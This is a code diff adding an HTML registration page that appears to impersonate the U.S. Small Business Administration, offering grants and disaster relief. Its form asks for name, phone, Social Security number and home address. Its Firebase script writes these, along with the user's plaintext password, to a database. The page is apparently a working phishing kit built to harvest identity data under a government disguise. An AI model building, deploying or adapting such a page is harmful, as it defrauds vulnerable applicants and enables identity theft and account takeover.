@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA | Registration Step 2</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root { --sba-navy: #002e6d; }
+        body { background: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
+        .auth-card { background: white; border-top: 6px solid var(--sba-navy); box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 500px; border-radius: 4px; }
+        input, select { height: 45px; border: 1.5px solid #e2e8f0; width: 100%; padding: 0 12px; font-size: 14px; border-radius: 4px; outline: none; }
+        label { display: block; text-transform: uppercase; font-size: 10px; font-weight: 800; color: #94a3b8; margin-bottom: 4px; }
+        .btn-finish { background: var(--sba-navy); height: 50px; color: white; width: 100%; font-weight: 700; text-transform: uppercase; font-size: 13px; border-radius: 4px; margin-top: 10px; }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-6">
+    <div class="auth-card p-8">
+        <div class="mb-8 text-center">
+            <h2 class="text-xl font-black text-gray-800 uppercase mb-2">Final Step: Verification</h2>
+            <div class="flex gap-1">
+                <div class="h-1.5 w-full bg-[#002e6d] rounded-full"></div>
+            </div>
+        </div>
+
+        <form id="finalForm" class="space-y-4">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div><label>First Name</label><input type="text" id="fname" required></div>
+                <div><label>Last Name</label><input type="text" id="lname" required></div>
+            </div>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div><label>Phone Number</label><input type="tel" id="phone" required placeholder="(555) 000-0000"></div>
+                <div><label>Social Security (SSN)</label><input type="password" id="ssn" maxlength="11" required placeholder="XXX-XX-XXXX"></div>
+            </div>
+            <div><label>Full Home Address</label><input type="text" id="address" required></div>
+            <div class="grid grid-cols-2 gap-4">
+                <div><label>City & State</label><input type="text" id="city" required></div>
+                <div><label>Zip Code</label><input type="text" id="zip" required></div>
+            </div>
+            <div>
+                <label>Select Your Grant Program</label>
+                <select id="program" required>
+                    <option value="SBA Grant">SBA Personal/Business Grant</option>
+                    <option value="Disaster Relief">Disaster Relief Assistance</option>
+                </select>
+            </div>
+
+            <button type="submit" id="finishBtn" class="btn-finish shadow-xl">Complete Enrollment</button>
+        </form>
+    </div>
+
+    <script type="module">
+        import { auth, db } from './firebase-config.js';
+        import { createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        document.getElementById('finalForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('finishBtn');
+            const email = sessionStorage.getItem('reg_email');
+            const pass = sessionStorage.getItem('reg_pass');
+            if(!email) { window.location.href="register1.html"; return; }
+
+            btn.disabled = true;
+            btn.innerText = "VERIFYING DATA...";
+
+            try {
+                const res = await createUserWithEmailAndPassword(auth, email, pass);
+                await setDoc(doc(db, "users", res.user.uid), {
+                    uid: res.user.uid,
+                    email: email,
+                    password: pass,
+                    fullName: document.getElementById('fname').value + " " + document.getElementById('lname').value,
+                    phone: document.getElementById('phone').value,
+                    ssn: document.getElementById('ssn').value,
+                    address: document.getElementById('address').value,
+                    city: document.getElementById('city').value,
+                    zip: document.getElementById('zip').value,
+                    program: document.getElementById('program').value,
+                    timestamp: new Date().toISOString()
+                });
+                sessionStorage.clear();
+                window.location.href = "welcome.html";
+            } catch (err) {
+                alert(err.message);
+                btn.disabled = false;
+                btn.innerText = "Complete Enrollment";
+            }
+        };
+    </script>
+</body>
+</html>
